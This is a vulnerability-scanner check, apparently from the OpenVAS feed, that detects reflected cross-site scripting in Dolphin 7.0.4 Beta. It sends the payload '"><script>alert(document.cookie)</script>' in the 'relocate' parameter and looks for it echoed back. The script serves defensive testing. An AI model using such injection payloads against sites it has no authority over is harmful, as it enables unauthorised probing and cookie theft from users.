if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801910" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-04-11 14:40:00 +0200 (Mon, 11 Apr 2011)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_name( "Dolphin Multiple Reflected Cross Site Scripting Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/98408/Dolphin7.0.4-xss.txt" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of an affected site." );
	script_tag( name: "affected", value: "Dolphin version 7.0.4 Beta" );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - Input passed via the 'explain' parameter in 'explanation.php' script
  and 'relocate' parameter in '/modules/boonex/custom_rss/post_mod_crss.php'
  script is not properly sanitized before being returned to the user." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Dolphin and is prone to multiple reflected
  cross-site scripting vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for path in nasl_make_list_unique( "/dolphin", "/", http_cgi_dirs( port: port ) ) {
	if(path == "/"){
		path = "";
	}
	res = http_get_cache( item: path + "/index.php", port: port );
	if(ContainsString( res, "<title>Dolphin" )){
		url = path + "/modules/boonex/custom_rss/post_mod_crss.php?relocate=\"><script>alert(document.cookie)</script>";
		req = http_get( item: url, port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && ContainsString( res, "><script>alert(document.cookie)</script>" )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

